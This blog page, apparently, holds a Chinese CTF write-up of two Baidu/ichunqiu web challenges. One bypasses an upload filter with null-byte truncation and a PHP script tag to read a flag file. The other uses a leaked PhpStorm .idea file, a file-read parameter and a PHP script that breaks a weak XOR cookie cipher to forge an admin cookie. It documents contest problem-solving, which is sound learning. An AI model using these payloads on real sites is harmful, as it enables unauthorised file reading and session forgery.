@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="x-man" />
+
+
+
+<meta name="description" content="WriteUp for Baidu on ichunqiu,September 3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="badidu CTF ichunqiu">
+<meta property="og:url" content="http://yoursite.com/2016/09/03/badidu-CTF-ichunqiu/index.html">
+<meta property="og:site_name" content="x-man's blog">
+<meta property="og:description" content="WriteUp for Baidu on ichunqiu,September 3">
+<meta property="og:updated_time" content="2016-09-03T12:36:56.756Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="badidu CTF ichunqiu">
+<meta name="twitter:description" content="WriteUp for Baidu on ichunqiu,September 3">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="x-man&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>badidu CTF ichunqiu | x-man&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: undefined
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">x-man</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">为伊消得人憔悴</p>
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/baidu/">baidu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ichunqiu/">ichunqiu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechall/">wechall</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于web安全</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">x-man</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">x-man</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">为伊消得人憔悴</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-badidu-CTF-ichunqiu" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/09/03/badidu-CTF-ichunqiu/" class="article-date">
+      <time datetime="2016-09-03T11:49:05.000Z" itemprop="datePublished">2016-09-03</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      badidu CTF ichunqiu
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/baidu/">baidu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ichunqiu/">ichunqiu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>WriteUp for Baidu ctf,September 3<br>url is <a href="http://www.ichunqiu.com/racing/ctf_54791?from=banner2" target="_blank" rel="external">http://www.ichunqiu.com/racing/ctf_54791?from=banner2</a></p>
+<h2 id="Upload-Web"><a href="#Upload-Web" class="headerlink" title="Upload Web"></a>Upload Web</h2><p>这是一道上传的题目，既然都告诉你是上传的题目，肯定有各种过滤，那么难点就在如何绕过，白帽子闲着没事没事就是绕过各种规则<br>首先，过滤了文件后缀，所有直接00截断<br>然后，过滤了&lt;? 和php，这里是很严格的过滤，类似的pphphp p/**/hp等都不能绕过。google一下，发现可以这样执行php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script language=&quot;PhP&quot;&gt;</div><div class="line">    echo &apos;aaaaa&apos;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>既然这样，那就直接file_get_contents就好，尝试了很多次，发现根本就不存在flag.php，后来发现整个请求体都过滤的php,所以flag.php就变成了flag，自然是不存在，那么怎么办呢？我们可以把php分开啊，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script language=&quot;PhP&quot;&gt;</div><div class="line">    echo file_get_contents(&quot;../flag.ph&quot;.&quot;p&quot;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>查看源代码就得到了你的flag!当你测试的时候，你可以利用<code>If(file_exists(&quot;/var/www/html/flag.ph&quot;.&quot;p&quot;)){echo &#39;yes&#39;;}</code>和<code>echo file_get_contents(&quot;../flag.php&quot;) or die(&#39;no&#39;);</code>进行测试。</p>
+<h2 id="Code-Web"><a href="#Code-Web" class="headerlink" title="Code Web"></a>Code Web</h2><p>看到题目，感觉这题应该会code，果然，不但要code，还要先看懂code<br>打开题目，看到一个萌妹子，挺好看的，查看源代码，发现图片并不是通过url加载的，而是<code>&lt;img src=&#39;data:image/gif;base64,xxxxx&gt;</code>，google发现如下都是可以的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&apos;data:image/gif;base64,图片内容base64加密数据&gt;</div><div class="line">&lt;img src=&apos;data:image/gif;base64,&lt;?php echo base64_encode(file_get_contents(&apos;flag.php&apos;))?&gt;&gt;</div></pre></td></tr></table></figure></p>
+<p>我们可以发现url中有个jpg参数，改之为jpg=index.php得到index.php的源码，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by PhpStorm.</div><div class="line"> * Date: 2015/11/16</div><div class="line"> * Time: 1:31</div><div class="line"> */</div><div class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</div><div class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</div><div class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span>);</div><div class="line">$file = $_GET[<span class="string">'jpg'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;file:'</span>.$file.<span class="string">'&lt;/title&gt;'</span>;</div><div class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</div><div class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"_"</span>, $file);</div><div class="line">$txt = base64_encode(file_get_contents($file));</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</div><div class="line"><span class="comment">/*</span></div><div class="line"> * Can you find the flag file?</div><div class="line"> *</div><div class="line"> */</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这题的难点就在于找flag文件，这里要知道：phpstorm的源码泄漏问题：<br>PhpStorm是一个php 的IDE。由于编辑器为了防止突然断电，保存项目。都会建立自己的文件夹。<br>每个项目的配置存储在项目所在目录的 .idea 文件夹中，并以XML格式保存配置。如果你设置的是 “default project settings 默认项目设置”，那么这个默认设置将会自动应用到下一个最新创建的项目上。<br>于是就找.idea的文件夹，找到了这个<a href="http://218.76.35.75:20106/.idea/workspace.xml,从中找到文件fl3g_ichuqiu.php。" target="_blank" rel="external">http://218.76.35.75:20106/.idea/workspace.xml,从中找到文件fl3g_ichuqiu.php。</a><br>因为index.php的代码会过滤参数jgp的值，把下划线删除，把config替换为_,所以，应该访问jpg=fl3gconfigichuqiu.php.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by PhpStorm.</div><div class="line"> * Date: 2015/11/16</div><div class="line"> * Time: 1:31</div><div class="line"> */</div><div class="line">error_reporting(E_ALL || ~E_NOTICE);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span>)</span> </span>&#123;</div><div class="line">    $hash = <span class="string">''</span>;</div><div class="line">    $max = strlen($chars) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)	&#123;</div><div class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($txt,$key)</span></span>&#123;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);</div><div class="line">    &#125;</div><div class="line">    $txt = $tmp;</div><div class="line">    $rnd=random(<span class="number">4</span>);</div><div class="line">    $key=md5($rnd.$key);</div><div class="line">    $s=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</div><div class="line">        $ttmp .= $txt[$i] ^ $key[++$s];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> base64_encode($rnd.$ttmp);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($txt,$key)</span></span>&#123;</div><div class="line">    $txt=base64_decode($txt);</div><div class="line">    $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);</div><div class="line">    $txt = substr($txt,<span class="number">4</span>);</div><div class="line">    $key=md5($rnd.$key);</div><div class="line"></div><div class="line">    $s=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</div><div class="line">        $tmp .= $txt[$i]^$key[++$s];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</div><div class="line">        $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $tmp1;</div><div class="line">&#125;</div><div class="line">$username = decrypt($_COOKIE[<span class="string">'user'</span>],$key);</div><div class="line"><span class="keyword">if</span> ($username == <span class="string">'system'</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    setcookie(<span class="string">'user'</span>,encrypt(<span class="string">'guest'</span>,$key));</div><div class="line">    <span class="keyword">echo</span> <span class="string">"╮(╯▽╰)╭"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>解密代码如下，网上找到的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ss</span><span class="params">($txt,$m)</span></span>&#123;</div><div class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($m);$i++)&#123;</div><div class="line">        $tmp .= chr(ord($m[$i])+<span class="number">10</span>);</div><div class="line">    &#125;</div><div class="line">        $m=$tmp;</div><div class="line">        $tmp=<span class="string">''</span>;</div><div class="line">    $txt=base64_decode($txt);</div><div class="line">    $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);</div><div class="line">    $txt = substr($txt,<span class="number">4</span>);</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">        $key .= $txt[$i] ^ $m[$i];</div><div class="line">    &#125;</div><div class="line">    $s=<span class="string">'0123456789abcdef'</span>;</div><div class="line">    $txt1=<span class="string">'system'</span>;</div><div class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt1);$i++)&#123;</div><div class="line">        $tmp .= chr(ord($txt1[$i])+<span class="number">10</span>);</div><div class="line">    &#125;</div><div class="line">        $txt1=$tmp;</div><div class="line">        $tmp=<span class="string">''</span>;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</div><div class="line">        $tmp = $key.$s[$i];</div><div class="line">        <span class="keyword">for</span>($ii=<span class="number">0</span>;$ii&lt;strlen($txt1);$ii++)&#123;</div><div class="line">            $txt2 .= $txt1[$ii] ^ $tmp[$ii];</div><div class="line">        &#125;</div><div class="line">        file_put_contents(<span class="string">'1.txt'</span>,base64_encode($rnd.$txt2).<span class="string">"\r\n"</span>,FILE_APPEND);   </div><div class="line">        $txt2=<span class="string">''</span>;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">ss(<span class="string">'eldUVRdOWRhI'</span>,<span class="string">'guest'</span>); <span class="comment">// 设置获取的guest用户的cookie值。</span></div></pre></td></tr></table></figure></p>
+<p>首先，访问<a href="http://ip/fl3g_ichuqiu.php" target="_blank" rel="external">http://ip/fl3g_ichuqiu.php</a> 获得Cookie: user=abcdefg<br>然后，把abcdefg设置为上面代码中ss函数的第一个参数，执行上面的php代码，或者16个密文，用burp加载后，跑一遍cookie中的user，即可得到flag 。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/09/03/badidu-CTF-ichunqiu/">badidu CTF ichunqiu</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">x-man</a></p>
+        <p><span>发布时间:</span>2016-09-03, 19:49:05</p>
+        <p><span>最后更新:</span>2016-09-03, 20:36:56</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/09/03/badidu-CTF-ichunqiu/" title="badidu CTF ichunqiu">http://yoursite.com/2016/09/03/badidu-CTF-ichunqiu/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2016/09/03/badidu-CTF-ichunqiu/　　作者: x-man" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/08/24/wechall-writeup-about-Crypto/">
+                    wechall writeup about Crypto
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-Web"><span class="toc-number">1.</span> <span class="toc-text">Upload Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Web"><span class="toc-number">2.</span> <span class="toc-text">Code Web</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"badidu CTF ichunqiu　| x-man's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2016/09/03/badidu-CTF-ichunqiu/" data-title="badidu CTF ichunqiu" data-url="http://yoursite.com/2016/09/03/badidu-CTF-ichunqiu/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"x-man"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/08/24/wechall-writeup-about-Crypto/" title="下一篇: wechall writeup about Crypto">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/09/03/badidu-CTF-ichunqiu/">badidu CTF ichunqiu</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/24/wechall-writeup-about-Crypto/">wechall writeup about Crypto</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/13/my-blog-is-ok/">my blog is ok</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/13/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016 x-man
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
